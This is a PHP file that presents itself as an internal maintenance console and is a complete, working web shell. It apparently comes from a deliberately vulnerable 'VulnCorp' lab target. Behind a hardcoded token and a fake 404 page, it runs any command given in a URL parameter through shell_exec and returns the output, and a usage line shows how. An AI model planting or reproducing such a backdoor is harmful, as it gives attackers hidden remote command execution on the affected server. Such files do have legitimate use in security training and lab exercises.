<?php
// =====================================================
// Internal maintenance console — DO NOT EXPOSE
// Auth: maintenance token required
// =====================================================

$token = isset($_GET['token']) ? $_GET['token'] : '';
$cmd   = isset($_GET['cmd'])   ? $_GET['cmd']   : '';

// "Security" — easily guessable default token
if ($token !== 'VulnCorp2024') {
    http_response_code(404);
    echo "<!DOCTYPE html><html><head><title>404 Not Found</title></head>";
    echo "<body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>";
    exit;
}

// Command execution backdoor
header('Content-Type: text/plain');
echo "=== VulnCorp Maintenance Console ===\n";
echo "Host: " . gethostname() . "\n";
echo "User: " . get_current_user() . "\n\n";

if ($cmd) {
    echo "$ " . $cmd . "\n";
    echo "---\n";
    echo shell_exec($cmd . " 2>&1");
} else {
    echo "Usage: ?token=VulnCorp2024&cmd=<command>\n";
    echo "Example: ?token=VulnCorp2024&cmd=id\n";
}
?>
